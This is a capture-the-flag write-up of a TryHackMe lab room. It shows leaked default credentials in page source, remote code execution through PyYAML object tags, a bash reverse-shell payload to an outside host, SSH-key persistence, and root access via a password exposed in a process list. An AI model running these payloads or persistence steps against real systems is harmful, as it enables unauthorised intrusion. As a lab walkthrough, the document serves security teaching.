---

Name: Beach bar
URL: https://tryhackme.com/room/hh-beachbar-d849f7f7
Difficulty: Easy
Description: At the Beach Bar, even shell access is complimentary. The jukebox takes requests. Any kind.

---

# Inspecting the page source
While looking for notes and hidden elements we find this note:
```html
<!--
    staff note: the demo DJ login is still enabled for the soft opening.
    dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

With these credentials we can login as a dj

# Exploring the DJ dashboard
We can export the playlist, 
```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

We can also import files, seems there is no restriction for the extenstions since we managed to upload a .txt file instead of a .yaml file

This is how it works with the playlist provided
```html
    
    
<div class="card">
  <h1>Import playlist</h1>
  <p class="muted">Paste a playlist (YAML) or upload a <code>.yml</code> set exported from another night.</p>
  <form method="post" enctype="multipart/form-data">
    <label for="playlist">Playlist YAML</label>
    <textarea id="playlist" name="playlist" placeholder="playlist:&#10;  name: ...">playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
</textarea>
    <label for="playlist_file">&hellip;or upload a file</label>
    <input type="file" id="playlist_file" name="playlist_file" accept=".yml,.yaml">
    <button type="submit">Load playlist</button>
  </form>
</div>




<div class="card">
  <h2>Loaded playlist</h2>
  <pre>{&#39;playlist&#39;: {&#39;name&#39;: &#39;Sunset Session&#39;, &#39;vibe&#39;: &#39;golden hour&#39;, &#39;tracks&#39;: [{&#39;artist&#39;: &#39;Khruangbin&#39;, &#39;title&#39;: &#39;Maria Tambien&#39;}, {&#39;artist&#39;: &#39;Men I Trust&#39;, &#39;title&#39;: &#39;Show Me How&#39;}, {&#39;artist&#39;: &#39;Crumb&#39;, &#39;title&#39;: &#39;Locket&#39;}]}}</pre>
  <p class="muted">Queued for tonight's set.</p>
</div>
```

# Testing if the import uses a safe function
Since the application accepts YAML uploads, the next step was to determine whether it uses yaml.safe_load() or an unsafe loader such as yaml.load().

To test this, we uploaded a payload containing a Python-specific YAML tag:
```yaml
!!python/tuple
- 1
- 2
- 3
```

If the application were using yaml.safe_load(), it would reject the !!python/tuple tag because Python object tags are not permitted. Instead, the application successfully deserialized the payload into a Python tuple:
```txt
(1, 2, 3)
```

This confirmed that the application was using an unsafe YAML loader capable of constructing arbitrary Python objects.

With that confirmed, we tested whether Python functions could also be invoked during deserialization using the !!python/object/apply tag:
```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

The server executed the id command and returned its output:
```txt
b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'
```

# Getting the revshell
First start a listener
```bash
nc -lvnp 4444
```

Now we upload the payload, generated with [revshells](https://www.revshells.com/) 
```yaml
!!python/object/apply:subprocess.check_output
- ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.138.209/4444 0>&1"]
```

# Creating SSH keys
We read the user flag and create some SSH keys for a better connection

Create them on our machine
```bash
ssh-keygen -t ed25519 -f /tmp/thm_beachbar -N ""
```

On the target we create the .ssh directory
```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
```

Append the key
```bash
$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDG3517QC5RHqwuu5D39U/5RocGLaEO+2dDJBjz6ZtOH theo@test' >> ~/.ssh/authorized_keys
$ chmod 600 ~/.ssh/authorized_keys
```

Then connect with it
```bash
$ ssh -i /tmp/thm_beachbar bartender@10.114.129.135
```

We can now transfer files to the server
```bash
scp -i /tmp/thm_beachbar /tmp/pspy64 bartender@10.114.129.135:/tmp/pspy64
```

# Exploring /opt
We find a jukeboxd directory
```bash
$ bartender@tryhackme-2404:/opt/beach-bar$ ls
jukeboxd  venv  webapp
```

It has a file called jukeboxd.py, which expects a password passed as an argument
```python
#!/usr/bin/env python3

import argparse
import time

NOW_PLAYING = [
    "Khruangbin - Maria Tambien",
    "Men I Trust - Show Me How",
    "Crumb - Locket",
    "Mac DeMarco - Chamber of Reflection",
]


def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()

    i = 0
    while True:
        track = NOW_PLAYING[i % len(NOW_PLAYING)]
        i += 1
        time.sleep(30)


if __name__ == "__main__":
    main()
```

# Looking for that process
We search for the process and find the password used to start it
```bash
$ ps auxww | grep jukebox
root         608  0.0  0.2  20176 11736 ?        Ss   09:00   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
bartend+    2531  0.0  0.0   7084  2172 pts/1    S+   09:51   0:00 grep --color=auto jukebox
```

# Testing for reused passwords
We try this password for the root account and it works
```bash
$ su root
SunsetSpritz2024!
```

Since we are root we can now read /root/root.txt
```bash
root@tryhackme-2404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# whoami
root
```
